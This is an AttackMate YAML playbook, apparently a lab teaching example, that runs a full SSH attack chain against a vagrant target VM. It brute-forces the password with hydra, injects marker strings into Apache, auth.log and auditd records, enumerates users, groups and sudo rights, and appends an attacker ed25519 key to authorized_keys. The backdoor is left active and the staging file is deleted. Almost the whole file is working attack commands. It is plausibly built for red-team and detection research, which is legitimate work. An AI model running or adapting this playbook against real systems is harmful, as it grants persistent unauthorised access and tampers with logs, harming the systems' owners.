#
# Author: AttackMate Persistence experiment (MIRANDA teaching example)
# Description:
#     Persistence by SSH AUTHORIZED KEYS. The operator generates an ed25519 keypair;
#     hydra brute-forces vagrant's SSH password; we log in and enumerate (id, uname,
#     /etc/group, sudo -l), then plant the attacker public key in vagrant's
#     ~/.ssh/authorized_keys for passwordless login that survives a password change, and
#     verify the key login works. Left active (no reversal); no sudo needed -- vagrant
#     owns ~/.ssh.
#
#     Tactic flow: Credential Access -> Initial Access -> Discovery -> Persistence (authorized_keys) -> Lateral Movement (verify key login)
#     (Defense Evasion runs throughout: the log-injection marker rides every step.)
#
# AUTHORIZED USE ONLY:
#     Run this only against systems you own or have explicit written permission to test.
#
vars:
  TARGET: 172.28.128.3
  BRUTE_USER: vagrant
  PASSWDLIST: ~/tmp/passwd          # pre-existing wordlist on the op host (must contain 'vagrant')
  # Log-injection marker. Space-free single token: auditd hex-encodes any argv that contains
  # a space, which would break the marker join across the access.log / auth.log / auditd layers.
  INJECTION: "this_is_the_injection"

commands:

  # ===================== Phase A: operator-side prep =====================
  - type: shell
    cmd: "mkdir -p /tmp/persist_sshkey"
    metadata:
      description: "Stage a local directory on the operator host to collect proof/output"

  - type: mktemp
    variable: KEY
    metadata:
      description: "Operator tempfile path for the backdoor SSH keypair"
      techniques: "T1098.004"
      tactics: "Persistence"

  # Ed25519, not RSA: the target runs OpenSSH 6.6 (Ubuntu 14.04) and a modern operator ssh
  # client refuses ssh-rsa (RSA/SHA-1) signatures, so an RSA key login fails. Ed25519 is
  # accepted by both ends and is the realistic modern attacker choice.
  - type: shell
    cmd: "rm -f $KEY ${KEY}.pub; ssh-keygen -q -t ed25519 -N '' -C persist_demo_key -f $KEY"
    metadata:
      description: "Generate an attacker SSH keypair on the operator"
      techniques: "T1098.004"
      tactics: "Persistence"

  # ===================== Phase 0: pre-exploit log poisoning =====================
  - type: http-client
    cmd: GET
    url: http://$TARGET/?probe=1
    useragent: "$INJECTION"
    exit_on_error: False
    metadata:
      description: "Benign-looking GET whose User-Agent seeds the marker into the Apache access log"
      techniques: "T1562.006"
      tactics: "Defense Evasion"

  - type: sleep
    seconds: 4
    min_sec: 1
    random: True
    metadata:
      description: "Human-paced jitter between the two probes"

  - type: ssh
    cmd: id
    username: "$INJECTION"
    password: "x"
    hostname: $TARGET
    interactive: False
    exit_on_error: False
    metadata:
      description: "Bogus SSH username injection -> poisons auth.log (Invalid user ...)"
      techniques: "T1110.001,T1562.006"
      tactics: "Credential Access,Defense Evasion"

  # ===================== Phase 1: Credential Access (SSH brute force) =====================
  - type: shell
    cmd: hydra -l $BRUTE_USER -P $PASSWDLIST ssh://$TARGET
    metadata:
      description: "Brute-force the SSH password with hydra"
      techniques: "T1110.001"
      tactics: "Credential Access"

  - type: setvar
    variable: CRACKED
    cmd: "PARSE_FAILED"
    metadata:
      description: "Pre-seed the cracked-password variable so a parse failure is detectable"
      techniques: "T1110.001"
      tactics: "Credential Access"

  - type: regex
    input: RESULT_STDOUT
    cmd: "login:\\s+$BRUTE_USER\\s+password:\\s+(\\S+)"
    mode: findall
    output:
      CRACKED: "$MATCH_0"
    metadata:
      description: "Parse the cracked SSH password from the hydra output"
      techniques: "T1110.001"
      tactics: "Credential Access"

  - type: debug
    cmd: "Cracked SSH password for $BRUTE_USER: $CRACKED"
    metadata:
      description: "Print the cracked credential (PARSE_FAILED means hydra did not crack it)"

  - type: ssh
    cmd: "bash -c 'id' \"$INJECTION\""
    username: $BRUTE_USER
    password: "$CRACKED"
    hostname: $TARGET
    interactive: False
    creates_session: "foothold"
    metadata:
      description: "Log in over SSH using the brute-forced password; execve poisoned with the marker"
      techniques: "T1078,T1021.004,T1033,T1562.006"
      tactics: "Initial Access,Lateral Movement,Discovery,Defense Evasion"

  - type: sleep
    min_sec: 2
    seconds: 6
    random: True
    metadata:
      description: "Operator-side think time before enumeration (human pacing)"

  # ===================== Phase 2: Discovery / enumeration =====================
  - type: ssh
    cmd: "bash -c 'id' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    save: /tmp/persist_sshkey/disc_01_id.txt
    metadata:
      description: "Current identity (expect vagrant); execve poisoned with the marker"
      techniques: "T1033,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: ssh
    cmd: "bash -c 'uname -a' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    save: /tmp/persist_sshkey/disc_02_uname.txt
    metadata:
      description: "Kernel name/version/arch; execve poisoned with the marker"
      techniques: "T1082,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: ssh
    cmd: "bash -c 'cat /etc/group' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    save: /tmp/persist_sshkey/disc_03_group.txt
    metadata:
      description: "Local groups and members (sudo/docker rosters); execve poisoned with the marker"
      techniques: "T1069.001,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: ssh
    cmd: "bash -c 'sudo -n -l 2>/dev/null' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    save: /tmp/persist_sshkey/disc_04_sudo.txt
    metadata:
      description: "List sudo privileges without a password (expect NOPASSWD ALL); execve poisoned with the marker"
      techniques: "T1069.001,T1033,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: debug
    cmd: "[ssh_authorized_keys] sudo -l (expect vagrant NOPASSWD: ALL) -> $RESULT_STDOUT"
    metadata:
      description: "Surface the sudo rules inline (context; this technique itself needs no sudo)"
      techniques: "T1069.001"
      tactics: "Discovery"

  - type: sleep
    min_sec: 2
    seconds: 6
    random: True
    metadata:
      description: "Operator-side think time before planting persistence (human pacing)"

  # ===================== Persistence: SSH Authorized Keys (T1098.004), LEFT ACTIVE =====================
  - type: sftp
    cmd: put
    local_path: ${KEY}.pub
    remote_path: /tmp/persist_demo.pub
    mode: "644"
    session: "foothold"
    metadata:
      description: "Stage the attacker public key on the target"
      techniques: "T1105"
      tactics: "Command and Control"

  - type: ssh
    cmd: "bash -c 'mkdir -p ~/.ssh' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    metadata:
      description: "Ensure vagrant's ~/.ssh directory exists; execve poisoned with the marker"
      techniques: "T1098.004,T1562.006"
      tactics: "Persistence,Defense Evasion"

  - type: ssh
    cmd: "bash -c 'chmod 700 ~/.ssh' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    metadata:
      description: "Restrict ~/.ssh to mode 700; execve poisoned with the marker"
      techniques: "T1098.004,T1562.006"
      tactics: "Persistence,Defense Evasion"

  - type: ssh
    cmd: "bash -c 'cat /tmp/persist_demo.pub >> ~/.ssh/authorized_keys' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    metadata:
      description: "Append the attacker key to vagrant's authorized_keys; execve poisoned with the marker"
      techniques: "T1098.004,T1562.006"
      tactics: "Persistence,Defense Evasion"

  - type: ssh
    cmd: "bash -c 'chmod 600 ~/.ssh/authorized_keys' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    metadata:
      description: "Restrict authorized_keys to mode 600; execve poisoned with the marker"
      techniques: "T1098.004,T1562.006"
      tactics: "Persistence,Defense Evasion"

  # Remove ONLY the staged public-key file (install hygiene - the key is already appended;
  # this does NOT undo the persistence).
  - type: ssh
    cmd: "bash -c 'rm -f /tmp/persist_demo.pub' \"$INJECTION\""
    session: "foothold"
    interactive: False
    exit_on_error: False
    metadata:
      description: "Remove the staged public-key file (staging hygiene); execve poisoned with the marker"
      techniques: "T1070.004,T1562.006"
      tactics: "Defense Evasion"

  # Prove passwordless key login works (logs an 'Accepted publickey for vagrant' auth.log entry).
  - type: shell
    cmd: "ssh -i $KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes $BRUTE_USER@$TARGET id"
    exit_on_error: False
    metadata:
      description: "Prove passwordless key login (auth.log 'Accepted publickey')"
      techniques: "T1021.004,T1098.004,T1033"
      tactics: "Lateral Movement,Persistence,Discovery"

  - type: debug
    cmd: "[ssh_authorized_keys] complete -> LEFT ACTIVE: persist_demo_key planted in vagrant authorized_keys; key login id -> $RESULT_STDOUT"
    metadata:
      description: "Surface the key-login result (no reversal - left active)"
      techniques: "T1098.004"
      tactics: "Persistence"
